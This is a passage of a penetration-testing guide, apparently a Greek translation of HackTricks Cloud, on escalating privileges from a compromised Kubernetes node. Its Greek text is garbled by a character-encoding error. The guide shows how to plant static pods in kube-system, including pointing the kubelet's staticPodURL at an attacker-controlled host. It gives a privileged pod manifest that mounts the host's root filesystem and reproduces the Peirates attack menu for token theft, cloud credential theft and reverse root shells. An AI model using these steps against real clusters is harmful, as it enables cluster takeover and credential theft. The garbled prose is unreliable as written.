ÏƒÎµ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ¬ namespaces (ÏƒÎµ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· Ï€Î¿Ï… Î±Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Ï‡ÏÎ®ÏƒÎ¹Î¼Î¿ Î³Î¹Î± ÎºÎ¬Ï€Î¿Î¹Î¿ Î»ÏŒÎ³Î¿).
{% endhint %}

Î‘Î½ Î²ÏÎ¯ÏƒÎºÎµÏƒÏ„Îµ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿Î½ ÎºÏŒÎ¼Î²Î¿ Ï„Î¿Ï… Î¿Î¹ÎºÎ¿Î´ÎµÏƒÏ€ÏŒÏ„Î·, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï„Î¿Î½ ÎºÎ¬Î½ÎµÏ„Îµ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î­Î½Î± **ÏƒÏ„Î±Ï„Î¹ÎºÏŒ pod Î¼Î­ÏƒÎ± ÏƒÏ„Î¿Î½ ÎµÎ±Ï…Ï„ÏŒ Ï„Î¿Ï…**. Î‘Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Ï€Î¿Î»Ï Ï‡ÏÎ®ÏƒÎ¹Î¼Î¿ ÎµÏ€ÎµÎ¹Î´Î® Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÏƒÎ±Ï‚ ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹ Î½Î± **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± pod ÏƒÎµ Î­Î½Î± Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÏŒ namespace** ÏŒÏ€Ï‰Ï‚ Ï„Î¿ **kube-system**.

Î“Î¹Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± ÏƒÏ„Î±Ï„Î¹ÎºÏŒ pod, Î· [**Ï„ÎµÎºÎ¼Î·ÏÎ¯Ï‰ÏƒÎ· ÎµÎ¯Î½Î±Î¹ Î¼ÎµÎ³Î¬Î»Î· Î²Î¿Î®Î¸ÎµÎ¹Î±**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/). Î’Î±ÏƒÎ¹ÎºÎ¬ Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏƒÏ„Îµ 2 Ï€ÏÎ¬Î³Î¼Î±Ï„Î±:

* Î¡ÏÎ¸Î¼Î¹ÏƒÎ· Ï„Î·Ï‚ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÎ¿Ï… **`--pod-manifest-path=/etc/kubernetes/manifests`** ÏƒÏ„Î·Î½ **Ï…Ï€Î·ÏÎµÏƒÎ¯Î± kubelet**, Î® ÏƒÏ„Î·Î½ **Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ· kubelet** ([**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)) ÎºÎ±Î¹ ÎµÏ€Î±Î½ÎµÎºÎºÎ¯Î½Î·ÏƒÎ· Ï„Î·Ï‚ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚
* Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Ï„Î¿Ï… Î¿ÏÎ¹ÏƒÎ¼Î¿Ï ÏƒÏ„Î¿ **Î¿ÏÎ¹ÏƒÎ¼ÏŒ pod** ÏƒÏ„Î¿ **`/etc/kubernetes/manifests`**

**ÎˆÎ½Î±Ï‚ Ï€Î¹Î¿ ÎºÏÏ…Ï†ÏŒÏ‚ Ï„ÏÏŒÏ€Î¿Ï‚ Î¸Î± Î®Ï„Î±Î½:**

* Î¤ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î·Î½ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ **`staticPodURL`** Î±Ï€ÏŒ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ·Ï‚ Ï„Î¿Ï… **kubelet** ÎºÎ±Î¹ Î¿ÏÎ¯ÏƒÏ„Îµ ÎºÎ¬Ï„Î¹ ÏƒÎ±Î½ `staticPodURL: http://attacker.com:8765/pod.yaml`. Î‘Ï…Ï„ÏŒ Î¸Î± ÎºÎ¬Î½ÎµÎ¹ Ï„Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± kubelet Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î­Î½Î± **ÏƒÏ„Î±Ï„Î¹ÎºÏŒ pod** Ï€Î±Î¯ÏÎ½Î¿Î½Ï„Î±Ï‚ Ï„Î· **Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ· Î±Ï€ÏŒ Ï„Î¿Î½ ÎºÎ±Î¸Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î¿ URL**.

**Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±** Ï„Î·Ï‚ **Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ·Ï‚ pod** Î³Î¹Î± Ï„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± ÎµÎ½ÏŒÏ‚ Ï€ÏÎ¿Î½Î¿Î¼Î¹Î¿ÏÏ‡Î¿Ï… pod ÏƒÏ„Î¿ **kube-system** Ï€Î¿Ï… Ï€ÏÎ¿Î­ÏÏ‡ÎµÏ„Î±Î¹ Î±Ï€ÏŒ [**ÎµÎ´Ï**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/):
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### Î”Î¹Î±Î³ÏÎ±Ï†Î® pods + Î¼Î· Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î±Ï„Î¹ÏƒÎ¼ÏŒÏ‚ ÎºÏŒÎ¼Î²Ï‰Î½

Î•Î¬Î½ Î­Î½Î±Ï‚ ÎµÎ¹ÏƒÎ²Î¿Î»Î­Î±Ï‚ Î­Ï‡ÎµÎ¹ **Î´Î¹Î±ÏÏÎµÏÏƒÎµÎ¹ Î­Î½Î±Î½ ÎºÏŒÎ¼Î²Î¿** ÎºÎ±Î¹ Î¼Ï€Î¿ÏÎµÎ¯ **Î½Î± Î´Î¹Î±Î³ÏÎ¬ÏˆÎµÎ¹ pods** Î±Ï€ÏŒ Î¬Î»Î»Î¿Ï…Ï‚ ÎºÏŒÎ¼Î²Î¿Ï…Ï‚ ÎºÎ±Î¹ **Î½Î± ÎºÎ¬Î½ÎµÎ¹ Î¬Î»Î»Î¿Ï…Ï‚ ÎºÏŒÎ¼Î²Î¿Ï…Ï‚ Î±Î½Î¯ÎºÎ±Î½Î¿Ï…Ï‚ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¿Ï…Î½ pods**, Ï„Î± pods Î¸Î± ÎµÏ€Î±Î½ÎµÎºÎºÎ¹Î½Î·Î¸Î¿ÏÎ½ ÏƒÏ„Î¿Î½ Î´Î¹Î±ÏÏÎµÏÏƒÎ±Î½Ï„Î± ÎºÏŒÎ¼Î²Î¿ ÎºÎ±Î¹ Î¸Î± Î¼Ï€Î¿ÏÎ­ÏƒÎµÎ¹ Î½Î± **ÎºÎ»Î­ÏˆÎµÎ¹ Ï„Î± tokens** Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹ ÏƒÎµ Î±Ï…Ï„Î¬.\
Î“Î¹Î± [**Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ Î±Ï…Ï„Î¿ÏÏ‚ Ï„Î¿Ï…Ï‚ ÏƒÏ…Î½Î´Î­ÏƒÎ¼Î¿Ï…Ï‚**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes).

## Î‘Ï…Ï„ÏŒÎ¼Î±Ï„Î± Î•ÏÎ³Î±Î»ÎµÎ¯Î±

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº ÏƒÏ„Î¿ AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Î•Î¹Î´Î¹ÎºÏŒÏ‚ Î•ÏÏ…Î¸ÏÎ¿Ï Î£Ï…Î½ÎµÏÎ³ÎµÎ¯Î¿Ï… AWS Ï„Î¿Ï… HackTricks)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Ï…Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î·Ï‚ Ï„Î¿Ï… HackTricks:

* Î‘Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î´Î¹Î±Ï†Î·Î¼Î¹ÏƒÎ¼Î­Î½Î· ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± Ï„Î·Î»ÎµÎ³ÏÎ±Ï†Î®Î¼Î±Ï„Î¿Ï‚**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Îµ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… github.

</details>
